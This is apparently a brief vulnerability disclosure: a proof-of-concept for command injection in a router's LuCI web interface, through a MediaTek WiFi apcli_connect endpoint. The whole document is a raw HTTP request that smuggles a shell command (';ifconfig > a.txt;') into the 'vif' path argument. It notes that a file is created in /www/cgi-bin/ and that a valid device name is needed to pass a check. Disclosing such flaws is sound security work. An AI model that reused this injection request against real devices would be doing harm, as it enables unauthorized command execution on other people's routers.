### poc
```
GET /cgi-bin/luci/admin/mtk/wifi/apcli_connect/MT7915D.1.2/;ifconfig > a.txt;  HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0

```
Here we set the arguments "dev" MT7915D.1.2 and vif as ";ifconfig > a.txt;", and there will be a file named "a.txt" in /www/cgi-bin/

### attention
To expolit successfully, we need the correct devname to pass the check.
